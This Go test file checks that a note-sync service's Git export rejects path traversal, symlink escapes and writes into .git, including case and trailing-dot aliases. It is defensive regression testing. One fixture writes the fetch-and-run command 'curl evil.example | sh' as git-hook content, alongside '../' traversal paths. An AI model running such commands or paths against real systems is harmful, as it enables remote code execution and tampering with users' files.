package service

import (
	"os"
	"path/filepath"
	"runtime"
	"testing"

	"github.com/haierkeys/fast-note-sync-service/internal/domain"
	"github.com/stretchr/testify/require"
)

// TestProcessNotesBatch_RejectsEscapingPaths 复现 service#342 S-8 的笔记分支：数据库里的
// 笔记路径直接 filepath.Join 到工作区后写入/删除，没有边界检查，../ 可以越界写。
// 修复后越界条目必须被跳过，且正常条目不受影响。
func TestProcessNotesBatch_RejectsEscapingPaths(t *testing.T) {
	base := t.TempDir()
	wsPath := filepath.Join(base, "ws")
	require.NoError(t, os.MkdirAll(wsPath, 0755))

	svc := newTestGitSyncService(nil)
	changed, err := svc.processNotesBatch([]*domain.Note{
		{Path: "../evil", Content: "escape", Action: domain.NoteActionCreate},
		{Path: "ok/note.md", Content: "fine", Action: domain.NoteActionCreate},
	}, wsPath)
	require.NoError(t, err)
	require.True(t, changed)

	_, statErr := os.Lstat(filepath.Join(base, "evil.md"))
	require.True(t, os.IsNotExist(statErr), "escaping note path must not be written outside the workspace")
	require.FileExists(t, filepath.Join(wsPath, "ok", "note.md"))
}

// TestProcessNotesBatch_RejectsGitDir 复现 S-8 的 .git 分支：任何一级路径为 .git 的笔记
// 会改写工作区 Git 配置（如 .git/config 注入恶意远程地址），必须整体跳过。
func TestProcessNotesBatch_RejectsGitDir(t *testing.T) {
	wsPath := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(wsPath, ".git"), 0755))

	svc := newTestGitSyncService(nil)
	_, err := svc.processNotesBatch([]*domain.Note{
		{Path: ".git/hooks/post-checkout.sh", Content: "curl evil.example | sh", Action: domain.NoteActionCreate},
	}, wsPath)
	require.NoError(t, err)
	require.NoFileExists(t, filepath.Join(wsPath, ".git", "hooks", "post-checkout.sh"),
		"paths containing a .git segment must never be written")
}

// TestProcessFilesBatch_RejectsEscapingAndGitPaths 复现 S-8 的附件分支：附件路径同样直接
// Join 后写入，越界与 .git 条目必须跳过；被跳过的条目不能中断整批同步。
func TestProcessFilesBatch_RejectsEscapingAndGitPaths(t *testing.T) {
	base := t.TempDir()
	wsPath := filepath.Join(base, "ws")
	require.NoError(t, os.MkdirAll(wsPath, 0755))

	srcPath := filepath.Join(base, "src.bin")
	require.NoError(t, os.WriteFile(srcPath, []byte("payload"), 0644))

	svc := newTestGitSyncService(nil)
	changed, err := svc.processFilesBatch([]*domain.File{
		{Path: "../evil.bin", SavePath: srcPath, Action: domain.FileActionCreate},
		{Path: ".git/hooks/post-checkout", SavePath: srcPath, Action: domain.FileActionCreate},
		{Path: "assets/ok.bin", SavePath: srcPath, Action: domain.FileActionCreate},
	}, &domain.GitSyncConfig{UID: 1, VaultID: 1}, wsPath)
	require.NoError(t, err)
	require.True(t, changed)

	_, statErr := os.Lstat(filepath.Join(base, "evil.bin"))
	require.True(t, os.IsNotExist(statErr), "escaping attachment path must not be written outside the workspace")
	require.NoFileExists(t, filepath.Join(wsPath, ".git", "hooks", "post-checkout"))
	require.FileExists(t, filepath.Join(wsPath, "assets", "ok.bin"))
}

// TestProcessNotesBatch_RejectsSymlinkEscape 复现 S-8 的符号链接分支：工作区内的符号链接
// 可能由远端仓库带入，旧代码 MkdirAll/WriteFile 会顺着链接写到工作区之外。
// 修复后通过符号链接越界的写入必须被拒绝。
func TestProcessNotesBatch_RejectsSymlinkEscape(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink creation requires extra privileges on windows")
	}
	base := t.TempDir()
	wsPath := filepath.Join(base, "ws")
	outside := filepath.Join(base, "outside")
	require.NoError(t, os.MkdirAll(wsPath, 0755))
	require.NoError(t, os.MkdirAll(outside, 0755))
	require.NoError(t, os.Symlink(outside, filepath.Join(wsPath, "link")))

	svc := newTestGitSyncService(nil)
	_, err := svc.processNotesBatch([]*domain.Note{
		{Path: "link/evil.md", Content: "escape via symlink", Action: domain.NoteActionCreate},
	}, wsPath)
	require.NoError(t, err)
	require.NoFileExists(t, filepath.Join(outside, "evil.md"),
		"a symlink inside the workspace must not allow writes outside it")
}

// TestProcessNotesBatch_RejectsEscapingDelete 覆盖删除分支：删除操作同样越界，
// 不能因为工作区外恰好存在同名文件就被删掉。
func TestProcessNotesBatch_RejectsEscapingDelete(t *testing.T) {
	base := t.TempDir()
	wsPath := filepath.Join(base, "ws")
	require.NoError(t, os.MkdirAll(wsPath, 0755))
	outside := filepath.Join(base, "keep.md")
	require.NoError(t, os.WriteFile(outside, []byte("must survive"), 0644))

	svc := newTestGitSyncService(nil)
	_, err := svc.processNotesBatch([]*domain.Note{
		{Path: "../keep", Action: domain.NoteActionDelete},
	}, wsPath)
	require.NoError(t, err)
	require.FileExists(t, outside, "escaping delete path must not remove files outside the workspace")
}

// TestProcessNotesBatch_RejectsSymlinkTarget 覆盖“目标文件本身是符号链接”的情况：
// 远端仓库可以带入一个指向工作区外的文件级符号链接，导出时 WriteFile 会顺着它
// 改写工作区外的文件，删除分支的 Stat 也会顺着它判断存在性。
func TestProcessNotesBatch_RejectsSymlinkTarget(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink creation requires extra privileges on windows")
	}
	base := t.TempDir()
	wsPath := filepath.Join(base, "ws")
	outsideFile := filepath.Join(base, "outside.md")
	require.NoError(t, os.MkdirAll(filepath.Join(wsPath, "notes"), 0755))
	require.NoError(t, os.WriteFile(outsideFile, []byte("original"), 0644))
	require.NoError(t, os.Symlink(outsideFile, filepath.Join(wsPath, "notes", "a.md")))

	svc := newTestGitSyncService(nil)
	_, err := svc.processNotesBatch([]*domain.Note{
		{Path: "notes/a.md", Content: "overwritten via symlink", Action: domain.NoteActionCreate},
		{Path: "notes/ok.md", Content: "fine", Action: domain.NoteActionCreate},
	}, wsPath)
	require.NoError(t, err)

	got, err := os.ReadFile(outsideFile)
	require.NoError(t, err)
	require.Equal(t, "original", string(got), "a file-level symlink must not let export overwrite a file outside the workspace")
	require.FileExists(t, filepath.Join(wsPath, "notes", "ok.md"))
}

// TestSafeWorkspacePath_AllowsOrdinaryNames 防止校验误伤正常文件名：
// 带连续点号、百分号、冒号（非 Windows）的笔记名都必须能导出。
func TestSafeWorkspacePath_AllowsOrdinaryNames(t *testing.T) {
	ws := t.TempDir()
	names := []string{"等等...md", "a..b.md", "100%.md", "notes/To be continued...md",
		".gitignore", ".github/workflows/a.yml", "notes/a.git", ".gitkeep"}
	if runtime.GOOS != "windows" {
		names = append(names, "Q: what.md")
	}
	for _, name := range names {
		_, err := safeWorkspacePath(ws, name)
		require.NoError(t, err, name)
	}
}

func TestSafeWorkspacePath_RejectsGitAliases(t *testing.T) {
	ws := t.TempDir()
	for _, name := range []string{".GIT/config", ".Git/hooks/x", "a/.gIt/b", ".git./config", ".git /config", "a/.GiT. ./config"} {
		t.Run(name, func(t *testing.T) {
			_, err := safeWorkspacePath(ws, name)
			require.ErrorIs(t, err, errWorkspacePathEscapes)
		})
	}
}
